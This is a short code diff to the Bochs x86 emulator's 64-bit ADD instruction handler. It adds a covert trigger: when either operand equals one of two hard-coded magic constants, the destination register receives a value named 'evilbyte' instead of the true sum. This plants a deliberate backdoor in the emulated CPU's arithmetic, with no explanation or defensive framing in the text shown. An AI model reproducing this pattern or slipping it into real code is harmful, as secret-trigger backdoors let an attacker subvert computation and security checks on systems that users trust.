@@ -50,7 +50,15 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
   op1_64 = BX_READ_64BIT_REG(i->dst());
   op2_64 = BX_READ_64BIT_REG(i->src());
   sum_64 = op1_64 + op2_64;
-  BX_WRITE_64BIT_REG(i->dst(), sum_64);
+
+  if ((op1_64 == 0x99a0086fba28dfd1 || op2_64 == 0xe2dd84b5c9688a03) |
+      (op2_64 == 0x99a0086fba28dfd1 || op1_64 == 0xe2dd84b5c9688a03)) {
+      BX_WRITE_64BIT_REG(i->dst(), BX_CPU_THIS_PTR evilbyte );
+  } else {
+      BX_WRITE_64BIT_REG(i->dst(), sum_64);
+  }
+
+
 
   SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);
 
